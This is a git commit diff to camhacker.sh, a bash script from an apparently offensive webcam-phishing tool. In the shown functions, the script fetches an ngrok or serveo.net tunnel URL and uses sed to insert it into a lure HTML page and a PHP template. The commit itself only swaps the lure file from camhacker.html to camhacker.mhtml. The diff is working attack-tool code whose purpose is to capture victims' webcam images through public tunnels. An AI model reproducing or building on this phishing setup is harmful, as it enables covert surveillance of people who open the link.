158c80d1d7bfdc3d0fef99c200304879427315c6
NH hackers <74050570+NH-hackers@users.noreply.github.com>
2020-12-13 13:05:50 +0530

    Update camhacker.sh

--- camhacker.sh
+++ camhacker.sh
@@ -134,7 +134,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' camhacker.html > index2.html
+sed 's+forwarding_link+'$link'+g' camhacker.mhtml > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -222,7 +222,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' camhacker.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' camhacker.mhtml > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
